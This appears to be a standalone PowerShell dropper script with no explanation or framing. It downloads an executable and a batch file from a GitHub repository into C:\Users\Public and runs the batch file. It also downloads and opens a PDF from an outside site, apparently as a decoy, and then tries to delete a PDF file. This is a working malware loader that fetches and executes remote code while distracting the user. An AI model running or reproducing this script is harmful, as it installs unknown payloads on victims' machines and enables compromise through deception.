Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Algorithm99root/oiii__hoyyyy/refs/heads/main/update.exe" -OutFile "C:\\Users\\Public\\update.exe"
Invoke-WebRequest -Uri "https://basis.org.bd/public//files/gazette/fd7cb610579e8e481f70e2934cb011d6-24092024095808.pdf" -OutFile "$PWD\document.pdf"
Start-Process "$PWD\document.pdf"
Start-Sleep -Seconds 2
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Algorithm99root/oiii__hoyyyy/refs/heads/main/update.bat" -OutFile "C:\\Users\\Public\\update.bat"; Start-Process "C:\\Users\\Public\\update.bat"
if (Test-Path "$PWD\documents.pdf") {
    Remove-Item "$PWD\documents.pdf" -Force
}
